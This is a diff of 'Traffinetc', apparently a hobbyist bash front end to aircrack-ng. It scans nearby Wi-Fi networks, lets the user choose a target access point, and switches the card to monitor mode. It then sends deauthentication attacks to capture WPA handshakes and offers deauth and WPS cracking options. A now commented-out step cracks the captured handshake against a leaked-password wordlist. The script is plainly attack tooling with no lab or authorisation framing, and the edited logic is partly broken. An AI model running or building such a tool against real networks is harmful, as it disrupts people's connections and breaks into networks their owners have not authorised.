@@ -1,4 +1,7 @@
 resize -s 38 150 > /dev/null
+bind 'TAB:menu-complete'
+
+
 #
 # colors
 BLUE='\033[0;34m'
@@ -16,10 +19,9 @@ interface=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {p
 
 function banner () {
     echo -e "                                  
-    Traffinetc v1.0
-    @github/${BRIGHT_PURPLE}Weekeyv${NC}" 
+  Traffinetc v1.0
+  @github/${BRIGHT_PURPLE}Weekeyv${NC}" 
 }
-
 
 function show_system_info() {
     # System information
@@ -30,7 +32,7 @@ function show_system_info() {
 
     interface=$(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | sed -n '2p')
     gum style \
-        --margin "2 4" \
+        --margin "2 2" \
     "System Status Panel" \
     "" \
     "Operating System   $os" \
@@ -38,23 +40,24 @@ function show_system_info() {
     "Hostname           $hostname" \
     "Uptime             $uptime" \
     "Interface          $interface"
-}
 
+
+}
 
 
 
 function run_airodump() {
     local interface=$1
-    gum style --bold "Scanning for Wi-Fi networks on interface: $interface"
-    gum style "ATTENTION: Make sure when you press Ctrl + C you are in the xterm window, not your main terminal."
-    gum style "When finished scanning, press Ctrl + C"
+    gum style --bold "  Scanning for Wi-Fi networks on interface: $interface"
+    gum style "  ATTENTION: Make sure when you press Ctrl + C you are in the xterm window, not your main terminal."
+    gum style "  When finished scanning, press Ctrl + C"
     # Calculate position - adjust these if your screen or font size differs
     rm -f outputfile*.csv
     local screen_width=1920
     local xterm_cols=100
     local xterm_rows=50
     local cell_width=8
-    local cell_height=16
+    local cell_height=4
     local x_offset=$((screen_width - xterm_cols * cell_width))
     local y_offset=0
     xterm -geometry ${xterm_cols}x${xterm_rows}+${x_offset}+${y_offset} -e "airodump-ng $interface --output-format csv -w outputfile"
@@ -66,7 +69,7 @@ function filter_info() {
     local input_file="outputfile-01.csv"
     local output_file="ap_info.csv"
     awk -F ',' 'BEGIN {OFS=","} {if ($1 != "") print $1, $4, $14, $6, $7}' "$input_file" > "$output_file"
-    gum style "Filtered information saved in $output_file"
+    gum style "  Filtered information saved in $output_file"
     cat "$output_file" | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
     rm -rf "outputfile-01.csv"
     rm -rf "ap_info.csv"
@@ -101,12 +104,12 @@ function choseTargetAp() {
 
     echo
 
-    target_line=$(printf "%s\n" "${gum_choices[@]}" | gum choose --header="Choose a target Wi-Fi network:")
+    target_line=$(printf "%s\n" "${gum_choices[@]}" | gum choose --header="  choose a target Wi-Fi network")
     selected=$(echo "$target_line" | cut -d '|' -f1 | xargs)
     bssid=$(echo "$selected" | awk '{print $1}')
     channel=$(echo "$selected" | awk '{print $4}')
-    gum style --bold "Selected Target BSSID → $bssid"
-    gum style --bold "Selected Target channel → $channel"
+    gum style --bold "  selected Target         {$bssid}"
+    gum style --bold "  selected Target channel {$channel}"
     
     startAttacking $bssid $channel
 }
@@ -114,15 +117,26 @@ function choseTargetAp() {
 function startAttacking() {
     local targetBSSID=$1
     local targetChannel=$2
-    gum confirm "Start get handshake file" && hand_shake="yes" || hand_shake="no"
-    if [[ "$hand_shake" == "yes" ]]; then
-        aircrack_start "$handshake_file" "$targetBSSID"  
-        gum style --foreground 212 "      Starting handshake capture process..."
-        gum input --placeholder "    Press Enter to begin..." >/dev/null
-        getHandshake "$targetBSSID" "$targetChannel"
+
+
+
+    if [ ! -f "$hand_shake" ] && [ ! -s "$hand_shake" ]; then
+        echo "  error: File '$hand_shake' does not exist or is empty!"
     else
-        echo "have good day brosky ~"
+        aircrack_start "$handshake_file" "$targetBSSID"  
+        exit 1
     fi
+
+
+
+
+    gum style --foreground 212 "  starting handshake capture process..."
+    gum input --placeholder " press Enter to begin..." >/dev/null
+    getHandshake "$targetBSSID" "$targetChannel"
+
+
+
+    # aircrack_start "$handshake_file" "$targetBSSID"  
 }
 
 function getHandshake () {
@@ -133,7 +147,7 @@ function getHandshake () {
     local currentPath=$(pwd)
 
     cd $currentPath/handshake
-    rm *
+
     sendDeauth "$bssid" "$interfaceLocal" &
     xterm -geometry 100x50 -e "airodump-ng -c $channel --bssid $bssid -w psk $interfaceLocal"
 
@@ -141,30 +155,41 @@ function getHandshake () {
 }
 
 function aircrack_start() {
-    local capfile=$1
-    local bssid=$2
-    local path_wordlist="/home/dvsys/Desktop/seclist/Passwords/Leaked-Databases/all-shit.txt"
-    aircrack-ng -w "$path_wordlist" -b "$bssid" "$capfile" 2>&1
+
+    echo "were done over here !"
+    # local capfile=$1
+    # local you_word_list_path= 
+    # local bssid=$2
+    # local path_wordlist="/home/dvsys/Desktop/seclist/Passwords/Leaked-Databases/all-shit.txt"
+    # aircrack-ng -w "$path_wordlist" -b "$bssid" "$capfile" 2>&1
+
+
+
 }
 
 
 
 function check_monitor_mode_support() {
-    interfaces=$(iw dev | awk '$1=="Interface"{print $2}')
-    if [[ -z "$interfaces" ]]; then
-        echo "No wireless interfaces found that support monitor mode."
-        exit 1
-    fi
 
-    interface=$(echo "$interfaces" | gum choose --header="Select a wireless interface (Monitor mode capable):")
-    if [[ -z "$interface" ]]; then
+    attack_kind=("Deauthentication attack" "Wps / wps2 crack" "Get handshake file")
+    current_attack=$(printf "%s\n" "${attack_kind[@]}" | gum choose --header="  Choose Attack Type")
+    
+    interfaces=$(iw dev | awk '$1=="Interface"{print $2}')
+    interface_result=$(echo "$interfaces" | gum choose --header="  choose which monitor")
+
+
+    if [[ -z "$interfaces" ]]; then
         echo "No interface selected. Exiting."
         exit 1
     fi
-    choice=$(echo -e "Yes\nNo" | gum choose --height=2 --header="Switch ($interface) to monitor mode?")
+
+
+
+
+    choice=$(echo -e "Yes\nNo" | gum choose --height=2 --header="  switch ($interface_result) to monitor mode?")
     if [[ "$choice" == "Yes" ]]; then
-        echo -e "$interface switched to monitor mode!"
-        airmon-ng start "$interface" > /dev/null
+        echo -e "  $interface_result switched to monitor mode!"
+        airmon-ng start "$interface_result" > /dev/null
     else
         echo -e "Sorry, we cannot run this script without Monitor mode!"
         exit 1
@@ -187,47 +212,54 @@ function checkRoot () {
 } 
 
 
-function checkTools() {
-    gum style --bold "Checking required tools..."
-    echo ""
-    tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
-    tools_found=0
-    missing_tools=()
-    for tool in "${tools[@]}"; do
-        sleep 0.2
-        if ! command -v "$tool" &> /dev/null; then
-            gum style "   $tool    not found"
-            missing_tools+=("$tool")
-        else
-            gum style --foreground=212 "found    $tool"
-            ((tools_found++))
-        fi
-    done
-    echo
-    if [ "$tools_found" -eq "${#tools[@]}" ]; then
-        gum style --bold "All tools found. Proceeding..."
-    else
-        gum style --bold "Some tools are missing:"
-        for tool in "${missing_tools[@]}"; do
-            gum style "Try installing with: sudo apt-get install $tool"
-        done
-        exit 1
-    fi
-}
+# function checkTools() {
+#     gum style --bold "Checking required tools..."
+#     echo ""
+#     tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
+#     tools_found=0
+#     missing_tools=()
+#     for tool in "${tools[@]}"; do
+#         sleep 0.2
+#         if ! command -v "$tool" &> /dev/null; then
+#             gum style "   $tool    not found"
+#             missing_tools+=("$tool")
+#         else
+#             gum style --foreground=212 "found    $tool"
+#             ((tools_found++))
+#         fi
+#     done
+#     echo
+#     if [ "$tools_found" -eq "${#tools[@]}" ]; then
+#         gum style --bold "All tools found. Proceeding..."
+#     else
+#         gum style --bold "Some tools are missing:"
+#         for tool in "${missing_tools[@]}"; do
+#             gum style "Try installing with: sudo apt-get install $tool"
+#         done
+#         exit 1
+#     fi
+# }
 
 
 
 function main () {
+    check_root
     clear 
     banner
     show_system_info
+
     check_monitor_mode_support
-    checkTools    
-    run_airodump "$interface"
+    run_airodump "$interface_result"
     filter_info
     choseTargetAp
 
 }
+
+
+
+
+
+
 
 main 
 
